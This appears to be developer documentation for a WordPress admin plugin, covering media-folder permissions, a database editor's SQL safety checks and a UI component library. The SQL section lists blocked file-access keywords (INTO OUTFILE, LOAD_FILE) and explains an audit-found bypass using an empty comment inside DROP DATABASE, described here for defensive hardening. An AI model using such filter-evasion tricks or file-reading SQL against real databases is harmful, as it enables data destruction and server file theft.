**Deux capacités, pas une.** `upload_files` (`CAP_USE`) est la capacité de **téléverser**, pas celle d'**organiser la bibliothèque du site** : s'en contenter partout laissait un simple auteur renommer les dossiers d'autrui et en supprimer un avec toute sa descendance, d'un seul appel. Les dossiers sont une taxonomie, la capacité qui décrit ce pouvoir est donc `manage_categories` (`CAP_MANAGE`, éditeur et au-dessus) : `guard()` pour la lecture et le classement, `guard_manage()` pour toute mutation de l'arborescence (créer, renommer, supprimer, déplacer, colorer). `ajax_move_items()` ajoute un contrôle **par pièce jointe** (`current_user_can( 'edit_post', $att_id )`) — la garde d'entrée dit que l'appelant peut utiliser la médiathèque, pas qu'il peut toucher *ce* média-là ; les refus sont comptés et remontés en `refused`, qu'un toast affiche, sinon un déplacement silencieusement partiel se lit comme un bug.

Le drapeau `canManage` (payload `skmtMedia`) masque côté JS le bouton « + », les menus « … » et le glisser-déposer de dossiers. **Piège** : `wp_localize_script()` convertit toutes les valeurs en **chaînes** — un `false` PHP arrive en `""` et un `true` en `"1"`, si bien qu'un test du genre `cfg.canManage !== false` est toujours vrai et ne masque jamais rien. Comparer aux deux formes (`=== true || === "1"`). Ce n'est de toute façon que cosmétique : la décision appartient à `guard_manage()`, qui ne lit rien de ce que le client envoie.

### Database

Table explorer/editor over `$wpdb`. `Module.php` is a thin AJAX layer (no settings — `get_settings()`/`save_settings()`/`get_defaults()` are no-ops); the whole UI is built client-side in `assets/admin/js/modules/database.js` from a two-pane template (`settings-template.php`: sidebar table list + main Données/Structure/Requête SQL tabs).

AJAX actions: `skmt_db_get_tables`, `skmt_db_get_rows`, `skmt_db_get_structure`, `skmt_db_update_row`, `skmt_db_delete_row`, `skmt_db_insert_row`, `skmt_db_truncate`, `skmt_db_drop_table`, `skmt_db_export_sql`, `skmt_db_run_query`.

Safety model (all server-side, never trust the client):
- **Table/column names** go through `read_table()` → `validate_table()` (checks against `information_schema.tables` for the current DB) and are whitelisted against `get_columns_map()` (`SHOW COLUMNS`). Uses `sanitize_text_field` (NOT `sanitize_key`) so mixed-case identifiers survive.
- **Typing**: `column_format()` maps each column to `%d`/`%f`/`%s` for `$wpdb->update`/`insert`/`delete`; NULL is explicit (a `set_null` flag / null value), rejected server-side if the column is `NOT NULL`.
- **Free SQL editor** (`ajax_run_query`). Tous les garde-fous testent la requête **normalisée** par `normalize_sql()`, jamais la chaîne brute ; c'est bien l'originale qui est exécutée ensuite.
  - `normalize_sql()` fait trois passes, et **l'ordre est le fond du sujet** : neutraliser les littéraux (`'…'`, `"…"`, `` `…` ``) d'abord — une ouverture de commentaire dans une chaîne n'ouvre rien, la traiter comme telle tronquerait la requête normalisée et masquerait la suite ; puis retirer les commentaires (`/* */`, `--`, `#`) ; puis compacter les espaces. Le trou exploité par l'audit était là : MySQL accepte un commentaire vide comme séparateur de mots, si bien qu'un `DROP` suivi d'un commentaire vide puis de `DATABASE` ne ressemblait à aucun mot-clé interdit tout en s'exécutant comme `DROP DATABASE`. **Étendre la liste noire n'y change rien** — il y a une infinité de façons d'écrire l'espace.
  - `find_forbidden_keyword()` compare des **mots entiers** (« migrant » ne contient plus « GRANT »). `FORBIDDEN_KEYWORDS` couvre aussi les accès disque du serveur MySQL : `INTO OUTFILE`, `INTO DUMPFILE`, `LOAD DATA`, `LOAD_FILE`.
  - `is_read_query()` ne se fonde **pas** sur le premier mot : un `SELECT` peut écrire (`INTO OUTFILE`), un `WITH … DELETE` s'ouvre sur un mot de lecture, et `SELECT 1; DELETE …` cache une seconde instruction. Il faut donc les trois : mot d'ouverture de lecture, aucun verbe d'écriture ailleurs, aucun point-virgule interne. Le sens de l'erreur est assumé — classer une lecture en écriture coûte une confirmation de plus, l'inverse coûte une table. `CREATE`/`DROP` sont volontairement hors de la liste des verbes d'écriture, pour que `SHOW CREATE TABLE` reste une lecture.
  - Toute écriture exige `$_POST['confirm']` (`database.js` pré-confirme via `window.skmtModal` et **miroite** `normalize_sql()`/`is_read_query()` — sinon l'interface croit la requête inoffensive et le serveur répond `needs_confirm`) ; sans lui, retour `needs_confirm`.
  - Le plafond `QUERY_ROW_CAP` (1000) ne s'applique qu'aux requêtes ouvertes par `SELECT` ou `WITH` : `SHOW`, `DESCRIBE` et `EXPLAIN` rendent un jeu déjà fini et **n'acceptent pas de `LIMIT`** — l'ajouter transformait `SHOW CREATE TABLE x` en erreur de syntaxe. La présence d'un `LIMIT` se lit sur la forme normalisée, sinon un `/* LIMIT 1 */` en commentaire faisait sauter le plafond.
- `friendly_db_error()` translates common MySQL errors (duplicate entry, FK constraint, NOT NULL, incorrect value) into readable messages.
- **Export** (`ajax_export_sql`): type-aware value emission (unquoted numerics, `0x…` hex for binary, `NULL`, explicit column list, `SET NAMES utf8mb4`).

Layout height is pure CSS via the `.skmt-admin-main:has(.skmt-db)` flex chain (no JS resize handler). SQL history is browser-local (`localStorage`, with a clear button) — not persisted server-side. All user-facing JS strings route through `skmtAdmin.i18n` (populated by `get_admin_js_data()`). There is no Structure-tab editing and no CSV export.

## Adding a new module

1. Create `includes/Modules/MyModule/Module.php` extending `AbstractModule`
2. Add a `settings-template.php` in the same folder
3. Register via the filter (no need to touch Core files):
```php
add_filter( 'skmt_module_definitions', function( array $modules ) {
    $modules['my_module'] = [
        'name'    => __( 'My Module', 'studio-kyne-mini-tools' ),
        'class'   => 'StudioKyne\\MiniTools\\Modules\\MyModule\\Module',
        'icon'    => 'package',
        // name, description, menu_label, menu_desc, icon
    ];
    return $modules;
} );
```
4. Add the class to the `$module_classes` array in `uninstall.php`

## CSS class conventions

Admin UI uses BEM-style classes prefixed with `skmt-`. Key patterns: `skmt-section`, `skmt-section__header`, `skmt-option`, `skmt-option__control`, `skmt-toggle`, `skmt-form__group`, `skmt-badge` (modifiers: `--success`, `--warning`, `--danger`, `--info`, `--inactive`), `skmt-btn` (modifiers: `--primary`, `--secondary`, `--sm`).

## Design system — composants réutilisables

All reusable components are defined in `assets/admin/css/components.css` and `assets/admin/js/admin.js`. **Always use these; never roll custom equivalents.**

### Modals

Two complementary systems, both defined in `components.css` + `admin.js`:

**1. Programmatic confirmation modal** — for simple confirm/cancel flows with no form input:
```javascript
window.skmtModal.open({
  title:        "Titre",
  message:      "Message explicatif.",
  confirmLabel: "Confirmer",
  cancelLabel:  "Annuler",
  danger:       true,           // bouton rouge au lieu de bleu
  onConfirm:    function() {},  // callback si l'utilisateur confirme
});
window.skmtModal.close(); // fermeture programmatique
```
Uses the singleton `#skmt-modal-overlay` in `templates/admin/layout.php`.

**2. Named modal (HTML persistant)** — for modals with form fields (inputs, selects, etc.):
```javascript
window.skmtModalOpen('my-modal-id');   // ajoute .is-open
window.skmtModalClose('my-modal-id');  // retire .is-open
```
HTML structure requise (copier ce template) :
```html
<div class="skmt-modal-overlay" id="my-modal-id" role="dialog" aria-modal="true" aria-labelledby="my-modal-title">
  <div class="skmt-modal">
    <div class="skmt-modal__header">
      <h3 id="my-modal-title" class="skmt-modal__title">Titre</h3>
    </div>
    <div class="skmt-modal__body">
      <!-- contenu, inputs, etc. -->
    </div>
    <div class="skmt-modal__footer">
      <!-- .skmt-modal-close sur le bouton Annuler → fermeture automatique -->
      <button type="button" class="skmt-btn skmt-btn--sm skmt-btn--secondary skmt-modal-close">Annuler</button>
      <button type="button" class="skmt-btn skmt-btn--sm skmt-btn--primary" id="my-confirm-btn">Valider</button>
    </div>
  </div>
</div>
```
La classe `.skmt-modal-close` et le clic hors-boîte sont gérés automatiquement par `admin.js`. Idem pour la touche Échap.

### Formulaires

```html
<!-- Groupe label + input -->
<div class="skmt-form__group">
  <label class="skmt-form__label" for="my-input">Label</label>
  <input type="text" class="skmt-input" id="my-input">
  <p class="skmt-form__help">Texte d'aide optionnel.</p>
</div>

<!-- Select standard -->
<select class="skmt-select">...</select>
<select class="skmt-select skmt-select--sm">...</select>  <!-- petit -->

<!-- Toggle -->
<label class="skmt-toggle">
  <input type="checkbox" name="...">
  <span class="skmt-toggle__slider"></span>
</label>
```

### Boutons

```html
<button class="skmt-btn skmt-btn--primary">Principal</button>
<button class="skmt-btn skmt-btn--secondary">Secondaire</button>
<button class="skmt-btn skmt-btn--danger">Danger</button>
<!-- Tailles : ajouter --sm pour petit -->
```

Un bouton peut être un `<a>` (« Ouvrir la médiathèque … »). `buttons.css` redéclare
donc la couleur sur `a.skmt-btn:hover/:focus/:active` par variante : sans ça,
`a:hover { color:#135e96 }` de wp-admin l'emporte (l'état ajoute une pseudo-classe
à la spécificité de `.skmt-btn--primary`) et le libellé vire au bleu au survol.

### Tooltips

```html
<button data-skmt-tip="Exporter ce menu en .json">…</button>
<button data-skmt-tip="…" data-skmt-tip-placement="right">…</button>   <!-- top par défaut -->
<?php echo $this->render_help_tip( __( 'Précision', 'studio-kyne-mini-tools' ) ); ?>  <!-- marqueur (i), dans le <label> -->
```

Système maison (pas de tippy.js : il tire Popper, et le plugin n'a ni build
ni bundler), défini dans `components.css` + `admin.js`. **Aucune
initialisation** : tout passe par délégation sur le `document`, donc le markup
rendu en JS après coup (arbre du créateur de menu, listes AJAX) est couvert
sans y penser. API : `window.skmtTooltip.hide()`, `.refresh()`, `.set(el, texte)`.

Trois points structurels :
- Le singleton est en `position:fixed` + `translate3d`, appendé au `<body>` :
  un tooltip enfant serait rogné par la première colonne en `overflow:hidden`
  (elles le sont toutes), et en `absolute` il devrait connaître les décalages
  de chacun de ses parents. Contrepartie : il faut suivre le défilement, d'où
  le recalcul sur `scroll`/`resize` throttlé en `requestAnimationFrame`, et le
  masquage automatique quand la référence sort de l'écran ou du DOM.
- La bascule (`top` → `bottom`…) n'a lieu que si le côté opposé offre **plus**
  de place, sinon la boîte oscille entre deux positions également trop petites.
  Après recadrage dans la fenêtre, la flèche est repositionnée sur la
  référence : sans ça elle pointe à côté dans les coins.
- Un `title` sur le même élément est retiré au premier survol (sauvegardé dans
  `data-skmt-tip-title`), sinon la bulle native double la nôtre. Les modules
  qui tournent **hors** des pages SKMT — `media.js`, chargé par
  `wp_enqueue_media` là où `admin.js` est absent — gardent donc les deux
  attributs : `title` sert de repli, `data-skmt-tip` prend le relais quand
  notre JS est là.

Pour une **précision secondaire** — la réserve qui compte mais qui allongerait
la ligne — `Admin::render_help_tip( $texte )` pose un marqueur dans le
`<label>` : l'icône Lucide `info` (`.skmt-tip-info`), pas une pastille dessinée
en CSS ni un soulignement pointillé sous le libellé — la première fabrique une
fausse icône, le second salit la ligne et ne se lit pas comme un contrôle.
`menu-creator.js` en a l'équivalent JS (`helpTip()`, icône servie par
`window.skmtLucide.info`). Ce qui **décrit** l'option reste dans le texte
d'aide visible ; seul le détail passe sous le marqueur.

Le survol comme le focus déclenchent la bulle (ce que `title` ne fait pas) ;
un tooltip déjà ouvert enchaîne sans délai sur le suivant. Sur les pages du
plugin, préférer `data-skmt-tip` à `title` pour tout contrôle en icône seule.

### Toasts / notifications

```javascript
window.skmtShowToast("Message", "success"); // success | error | info | warning
```
Défini dans `assets/admin/js/notifications.js`, chargé globalement.

### Design tokens (CSS custom properties)

Définis dans `assets/admin/css/reset.css` :
- Couleurs : `--skmt-accent`, `--skmt-success`, `--skmt-danger`, `--skmt-warning`
- Neutres : `--skmt-n50` … `--skmt-n950`, `--skmt-surface`, `--skmt-border`, `--skmt-text`, `--skmt-text-secondary`
- Rayons : `--skmt-radius`, `--skmt-radius-sm`, `--skmt-radius-xs`
- Ombres : `--skmt-shadow`, `--skmt-shadow-md`, `--skmt-shadow-lg`
